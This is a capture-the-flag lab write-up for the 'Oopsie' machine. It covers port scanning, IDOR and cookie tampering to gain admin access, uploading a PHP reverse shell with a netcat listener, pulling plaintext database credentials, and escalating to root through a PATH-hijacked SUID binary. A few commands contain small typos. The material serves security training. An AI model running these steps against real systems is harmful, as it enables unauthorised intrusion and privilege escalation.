# Oopsie Write-Up 
by ZeroTrustWraith

This write-up was written using the help of the official write-up (no author attribution in the official write-up). However, there were some gaps in the official write-up. Due to those gaps, I wrote this write-up to provide more clarity and a better learning experience to demonstrate how malicious actors think and move through systems. For the best learning experience, do not skip any steps. If you have questions on how something works, use external resources.

## Enumeration

### **1. Start by scanning for open ports**

```nmap -sC -sV <target_IP>```

Port 22 (SSH) and port 80 (HTTP) are open.

### **2. Navigate to the target**

 Open your browser and navigate to **`http://<target_IP>:80`** 

Notice that page doesn't lead anywhere. However, if we navigate to the bottom of the page, there's some info. There's a notice that says "Please login to get access to the service." There is also a domain. We can add this to our **/etc/hosts** file if need be. 

Example on adding domains to /etc/hosts: ```sudo echo '<target_IP> megacorp.com' | sudo tee -a /etc/hosts```

### **3. Set up BurpSuite**
   
To help find info on the login page, we can setup proxy settings in our web browser to work with BurpSuite. However, newer versions of BurpSuite allow you to use a browser in the tool's GUI to intercept webpage data and spider the website. For all intensive purposes, I am only going to use BurpSuite for OSINT for this challenge.

* Start BurpSuite and navigate to the Proxy tab.
* From there, select "Open browser." Enter the URL for the Web Server (http://<target_IP>) and then navigate to the "Target" tab in BurpSuite.

We can see a GET request for **/cdn-cgi/login/**


### **4. Navigate to the login URL**

Navigate to the login URL at `http://<target_IP>/cdn-cgi/login` 

**Note:** At this point, I preferred to navigate out of BurpSuite into my standard FireFox browser. 

### **5. Attempt to login**

Notice that you need a username and password to get in. Generic login info isn't working, so select login as guest. 

Once logged in, we notice there is an uploads tab. However, upon clicking it, it states that we need super admin rights. We need to do further OSINT to see if we can find a way to escalate privileges.
 
### **6. Open your developer tools in the browser and perform some reconnaissance**

Open your developer tools in your browser (usually found in the hamburger menu under "more tools"). Navigate to the **storage section** and view the **cookies** under the "Cookies" dropdown. Notice that it shows our role as "guest" and lists a user ID. If we can find an admin user ID, we might be able to manipulate the cookies to escalate privileges.

Upon inspection, we can find that the URL says `http://<target_IP>/cdn-cgi/login/admin.php?content=accounts&id=2233`. 

### **7. Try to manipulate the URL**

Let's try to change this and see if we can find admin user ID information. We will set the id to 1:

`http://<target_IP>/cdn-cgi/login/admin.phpcontent=accounts&id=1`

We are provided with a page that has an access ID of **34322** and the name listed as **admin**. 

### **8. Manipulate the cookies**

We then move back to our developer console and see if we can manipulate the cookies.
* Double click the field that says "guest" and change it to "admin." 
* Double click the field that has the User ID 2233 and change it to the ID we found: 34322
* Refresh your browser.


## Foothold

### **1. Install webshells** 

Now that we have access to the Uploads page, we can see that it allows file uploads. We will attempt to upload a PHP reverse shell. To do this, we will need to install webshells.

* If you are on Kali, install webshells using this command: ```sudo apt update && sudo apt install webshells -y```
* If you are on another distro that is not debian-based or the command is not working, please refer to the official write-up and other resources.

### **2. Edit the reverse shell file**

Head to **/usr/share/webshells/php** on your local system and edit the php-reverse-shell.php file

```cd /usr/share/webshells/php```

```sudo nano php-reverse-shell.php```

Change the **$ip** field to your tun0 IP address and the **$port** to 1337. Press ctrl + o and then hit enter to save the file. 

**Note:** You can view your tun0 IP address with `ifconfig` or `ip addr show tun0`

### **3. Upload the php**

Now, go to the uploads section of the target webpage and upload the file. 

### **4. More OSINT**

Now we need to do more OSINT to see where the file is stored. We will run gobuster using a seclist for dir busting.

```gobuster dir --url http://<target_IP>/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php```

While this is running, we can start our netcat listener.

### **5. Start Netcat**

Start a netcat listener in a **separate** terminal session while you wait on gobuster. This will be useful for establishing a reverse shell.

```nc -nvlp 1337```

### **6. Establishing the reverse shell**

Notice that gobuster finds the **/uploads** directory. We don't have permission to access the directory, but we can try to access our uploaded php file.

Open a new browser and navigate to `http://<target_IP>/uploads/php-reverse-shell.php` 

**Note:** If the netcat listener does not show a connection, just re-upload the file in the website and refresh the page with the reverse shell URL.

### **7. Turn our shell into a functional terminal**

We need to execute a command from our new shell command line to make it function like a normal command line interface (CLI):

```python3 -c 'import pty;pty.spawn("/bin/bash")'```


## Internal Enumeration

### **1. Perform more reconnaissance**

Notice that we are the user www-data. We have restricted access on the system.
We know that the site is using PHP and SQL, so we will enumerate the web directory further for potential
disclosures or misconfigurations.

```find / -type d -name "*login*" 2>/dev/null```

Upon inspection, we can see a directory called ```/var/www/html/cdn-cgi/login```. 

**Note:** In a more secure environment, we would search for keywords like ```"*conf"``` ```"*settings"``` and ```"*.env"```. In an enterprise environment, you won't find sensitive login information in a "login" directory. If someone did that, they would be getting fired.

* Head to the /login directory: ```cd /var/www/html/cdn-cgi/login```
* List the files/directories in the /login directory: ```ls```

We can see several php files here. We can `cat` them to see what they have. The file "db" sounds short for "database." Let's start there.

```cat db.php```

Look at that! The db.php file provides us with a **username** and **password**.

**Username: robert**
**Password: M3g4C0rpUs3r!**

### **2. Search for admin login information**

Even though we have found the username and password, let's see if we can find admin login info:

```find / -type d -name "*passwd*" 2>/dev/null```

Notice the **/etc/passwd** directory listed when you search the system for the keyword "passwd"

```cat /etc/passwd```

**Note:** /etc/passwd lists usernames. Notice that bug-reporting also says "admin" next to it. This is useful information worth noting.


## Privilege Escalation

### **1. Log into the user account**

Let's log into robert's account and see if we can escalate privileges:
```su robert```

Enter the credentials we found earlier: **M3g4C0rpUs3r!**

### **2. Test privilege escalation**

Try to test privilege escalation using sudo. If robert can use sudo, we have achieved privilege escalation.

```sudo -l```

### **3. Perform reconnassaince on the user account**

We are unable to escalate our privileges using sudo. Let's run an id check to see what groups robert is in.

```id```

We notice that robert is part of the bugtrackers group. Earlier, we saw that bug-reporting mentioned admin privileges. Let's do a quick search to see what we can find.

### **4. Use the recon findings to search the system**

Search for the bugtracker group in the system's files

```find / -group bugtracker 2>/dev/null```

We can see a directory **/usr/bin/bugtracker**. Let's run a search and list the file using the flag `-la` to show permissions, owner, size, etc. Additionally, we will run the command `file` to examine what the file actually is.

```ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker```

We discover that the file is owned by **root** and that there is an **suid** set on the binary, which is a promising exploitation path.

### **5. Run the bugtracker application**

Run the application to examine it's behavior.

```/usr/bin/bugtracker```

Upon running it, we are asked to provide a bug ID. Enter a digit to satisfy the request for user input and hit enter. The system tells us there is no such file or directory, referencing a `cat` without a full path. This means it is relying on a **$PATH** environment variable in the user's session to find the executable. Let's try to exploit this.

### **6. Create a file called "cat"**

Navigate to the **/tmp** directory so we can create a file. We use /tmp because it is world-readable and accessible for users with restricted permissions. 

```echo '/bin/sh" > /tmp/cat```

Verify what directory `cat` is being called from

```which cat```

Notice that it says **/bin**

### **7. Make "cat" an executable file**

Now, we need to change the permissions for the new file so that it is executable.

```chmod +x /tmp/cat```

### **8. Add /tmp to the $PATH environment variable**

Now we need to add the /tmp directory to the $PATH environment variable.

```export PATH=/tmp:$PATH```

**NOTE:** **If you close the shell session, this setting will reset.** 

### **9. Verify the path**

Now check the $PATH

```echo $PATH```

Our new path has /tmp listed first, so the bugtracker will execute the cat file we made in /tmp directory before it will execute the real one in the /bin directory. Now run `which cat` again just to verify which one is being called first.

```which cat```

This confirms that `cat` is now pointing to the /tmp folder file we just made with a shell script.

### **10. Run the bugtracker program again**

Run the bugtracker file from the /tmp directory we are currently in. This is possible because /usr/bin is in the $PATH. This means you can execute bugtracker for anywhere in the system.

```bugtracker```

Enter a digit, such as "2."

You should now see a **#** which indicates we have obtained a root shell.

### **11. Verify root privilege escalation**

To verify if we have root, run the command:

```whoami```

You will see that we are root. 

### **12. Navigate to the root directory**

Navigate to the **/root** directory using this command:

```cd /root```

### **13. Perform recon on the root directory**

list all the files

```ls```
We can see a file named root.txt

### **14. Output the contents of the root.txt file**

You can now `cat` the root file

```cat root.txt```

Notice how it doesn't return a flag? That's because we created a file named "cat" with a shell script in it. Instead of using "cat," we need to run the command directly from the /bin directory using the full file path

```/bin/cat root.txt```

Alternatively, you can use head root.txt

```head root.txt```

**MACHINE PWNED!**
